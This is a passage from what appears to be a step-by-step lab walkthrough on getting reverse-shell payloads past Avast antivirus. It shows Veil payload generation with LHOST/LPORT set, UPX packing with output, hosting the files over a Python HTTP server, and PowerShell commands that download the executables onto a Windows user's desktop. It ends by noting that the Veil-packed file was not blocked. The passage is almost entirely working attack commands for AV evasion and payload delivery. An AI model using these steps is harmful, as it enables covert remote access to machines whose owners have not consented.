     73802 ->     47104   63.82%    win32/pe     reverse_tcp_encoded_upx.exe   

Packed 1 file.
```

`python -m SimpleHTTPServer 80`.

**Step 6**.

`(New-Object Net.WebClient).DownloadFile('http://172.16.5.101/reverse_tcp_encoded_upx.exe', 'C:\Users\aline\Desktop\reverse_tcp_encoded_upx.exe')`.

But Avast AV blocked this file.

**Step 7**.

`veil`, `use 1`, `list`, `use 28`, `set LHOST 172.16.5.101`, `set LPORT 4444`, `generate`, `reverse_tcp_veil`, `1`.

**Step 8**.

`mv /var/lib/veil/output/compiled/reverse_tcp_veil.exe /root/Desktop/reverse_tcp_veil.exe`

`upx --best --ultra-brute -f reverse_tcp_veil.exe -o reverse_tcp_veil_upx.exe`:
```        
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   4773422 ->   4740654   99.31%    win32/pe     reverse_tcp_veil_upx.exe      

Packed 1 file.
```

`python -m SimpleHTTPServer 80`.

**Step 9**.

`(New-Object Net.WebClient).DownloadFile('http://172.16.5.101/reverse_tcp_veil_upx.exe', 'C:\Users\aline\Desktop\reverse_tcp_veil_upx.exe')`.

Avast AV did not block this file.

---
---
